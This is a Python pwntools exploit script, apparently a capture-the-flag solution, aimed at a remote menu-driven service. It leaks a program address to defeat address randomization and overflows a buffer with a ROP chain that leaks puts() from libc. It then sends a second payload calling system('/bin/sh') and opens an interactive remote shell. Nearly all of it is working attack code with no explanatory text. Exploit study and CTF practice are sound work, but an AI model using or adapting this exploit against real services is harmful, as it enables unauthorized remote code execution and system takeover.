#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:s:b:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v
    elif k == '-s':
        puts_system_distance=int(v,16)         
    elif k == '-b':
        binsh_system_distance=int(v,16)  
                            
io=remote(target, port)

#puts_system_distance=0x2d7a0
#binsh_system_distance=0x141302 

print (">>> p offset is "+hex(puts_system_distance))
print (">>> b offset is "+hex(binsh_system_distance))

#time.sleep(20)

response=str(io.recvuntil(b"Exit\n>"),'utf-8')
print (response.strip())

io.sendline(b"2")
print (">>> We sent 2\n")

response=str(io.recvuntil(b"sell?"),'utf-8')
print (response.strip())

io.sendline(b"A")
print (">>> We sent A\n")
        
response=str(io.recvuntil(b"it?"),'utf-8')
print (response.strip())
        
io.sendline(b"123456781")
print (">>> We sent 123456781\n")

str(io.recvuntil(b"12345678"),'utf-8') 
addr=int.from_bytes(io.recvn(6),"little") 

base=addr-0x40c0
pop_rdi=base+0x13c3
sub_rsp=base+0x1219
got_puts=base+0x4018
plt_puts=base+0x1030
main=base+0x10a0

print (">>> Found address at "+hex(addr))
print (">>> Base address is "+hex(base))

response=str(io.recvuntil(b"details:"),'utf-8')
print (response.strip())

payload=b"A"*40
payload+=p64(pop_rdi)
payload+=p64(got_puts)
payload+=p64(plt_puts)
payload+=p64(main)
payload+=p64(sub_rsp)
io.sendline(payload)
print (">>> We sent 80 bytes to overwrite save RIP\n")

io.recvn(1)
puts_addr=int.from_bytes(io.recvn(6),"little") 
print (">>> puts() address is "+hex(puts_addr))

response=str(io.recvuntil(b"Exit\n>"),'utf-8')
print (response.strip())

io.sendline(b"11")
print (">>> We sent 11\n")

system_addr=puts_addr-puts_system_distance
binsh_addr=system_addr+binsh_system_distance

response=str(io.recvuntil(b"details:"),'utf-8')
print (response.strip())

payload=b"A"*40
payload+=p64(pop_rdi)
payload+=p64(binsh_addr)
payload+=p64(system_addr)
payload+=p64(main)
payload+=p64(sub_rsp)
io.sendline(payload)

io.interactive()


